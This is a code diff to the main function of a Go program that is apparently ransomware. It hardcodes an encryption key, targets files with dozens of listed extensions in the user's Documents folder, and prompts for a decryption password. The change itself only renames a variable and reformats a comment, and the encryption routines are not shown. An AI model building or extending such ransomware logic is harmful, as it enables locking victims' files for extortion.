@@ -33,8 +33,10 @@ func userHomeDir() string {
 func main() {
 	// 32 Bit Encryption Password.
 	key := "yjXTF0KtaEk3wOTdV2IZWbazSZPP8JMM"
-	// Only encrypt files and folders in this directory & subdirectories.
-	// TODO: Update File discovery to exclude SYSTEM owned files.
+	/*
+		Only encrypt files and folders in this directory & subdirectories.
+		TODO: Update File discovery to exclude SYSTEM owned files.
+	*/
 	rootDir := userHomeDir() + "\\Documents\\"
 	// Art Banner
 	banner := color.Red.Sprint(`
@@ -56,7 +58,7 @@ func main() {
 	// Password Prompt
 	decrypt := color.Magenta.Sprint("Enter Decryption Password:")
 	// Only Encrypt these file extensions.
-	fileextentions := []string{
+	fileExtensions := []string{
 		"3dm", "max", "3ds", "uot", "stw", "sxw", "ott", "odt", "rpm",
 		"7z", "rar", "zip", "backup", "bin", "bac", "iso", "vcd", "bmp", "png", "gif", "raw",
 		"accdb", "sql", "sqlitedb", "sqlite3", "asc", "lay6", "lay", "mml", "sxm", "otg", "odg",
@@ -85,7 +87,7 @@ func main() {
 	size := 33554432
 
 	// Calls `NewFiles` and begins searching for files to encrypt.
-	e := files.NewFiles(rootDir, fileextentions, size)
+	e := files.NewFiles(rootDir, fileExtensions, size)
 	systemfiles, err := e.ScanToEncrypt()
 	if err != nil {
 		fmt.Println(err)
@@ -109,7 +111,7 @@ func main() {
 	var password string
 	fmt.Scanln(&password)
 	// Decrypt files, if valid password is provided.
-	efs := files.NewFiles(rootDir, fileextentions, size)
+	efs := files.NewFiles(rootDir, fileExtensions, size)
 	encryptedfiles, _ := efs.ScanToDecrypt()
 
 	// Compare user provided password with set value
